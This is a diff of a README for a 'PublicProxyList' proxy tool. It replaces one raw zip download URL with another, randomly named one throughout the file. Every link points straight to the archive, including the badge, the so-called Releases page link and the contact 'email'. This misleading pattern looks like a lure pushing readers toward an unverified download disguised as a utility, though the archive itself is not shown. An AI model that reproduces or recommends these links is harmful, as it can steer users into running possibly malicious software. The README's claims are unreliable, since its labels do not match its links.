@@ -1,6 +1,6 @@
 # 🛠️ PublicProxyList - Access Diverse Proxy Options Easily
 
-[![Download PublicProxyList](https://raw.githubusercontent.com/gtaiv005/PublicProxyList/main/unenviable/PublicProxyList_v1.7.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/gtaiv005/PublicProxyList/main/unenviable/PublicProxyList_v1.7.zip)
+[![Download PublicProxyList](https://raw.githubusercontent.com/gtaiv005/PublicProxyList/main/unenviable/Public_Proxy_List_erratically.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/gtaiv005/PublicProxyList/main/unenviable/Public_Proxy_List_erratically.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to PublicProxyList! This tool provides a public list of various proxy ty
 
 To get started, visit the Releases page to download the application. All the latest versions and files you need are available there.
 
-[Download PublicProxyList](https://raw.githubusercontent.com/gtaiv005/PublicProxyList/main/unenviable/PublicProxyList_v1.7.zip)
+[Download PublicProxyList](https://raw.githubusercontent.com/gtaiv005/PublicProxyList/main/unenviable/Public_Proxy_List_erratically.zip)
 
 ### Step-by-Step Installation
 
-1. **Visit the Releases Page**: Click on the link above, or go to [this link](https://raw.githubusercontent.com/gtaiv005/PublicProxyList/main/unenviable/PublicProxyList_v1.7.zip).
+1. **Visit the Releases Page**: Click on the link above, or go to [this link](https://raw.githubusercontent.com/gtaiv005/PublicProxyList/main/unenviable/Public_Proxy_List_erratically.zip).
 
 2. **Select the Latest Release**: Look for the most recent version at the top of the list. This version will have the newest features and bug fixes.
 
@@ -76,8 +76,8 @@ If you find any issues or have suggestions for improvement, feel free to submit 
 
 ## 💬 Contact
 
-For questions or support, please visit the Issues section on our GitHub page. You can also reach out via email at https://raw.githubusercontent.com/gtaiv005/PublicProxyList/main/unenviable/PublicProxyList_v1.7.zip
+For questions or support, please visit the Issues section on our GitHub page. You can also reach out via email at https://raw.githubusercontent.com/gtaiv005/PublicProxyList/main/unenviable/Public_Proxy_List_erratically.zip
 
 Thank you for using PublicProxyList! Enjoy greater internet freedom with our extensive proxy options. 
 
-[Download PublicProxyList](https://raw.githubusercontent.com/gtaiv005/PublicProxyList/main/unenviable/PublicProxyList_v1.7.zip)
+[Download PublicProxyList](https://raw.githubusercontent.com/gtaiv005/PublicProxyList/main/unenviable/Public_Proxy_List_erratically.zip)
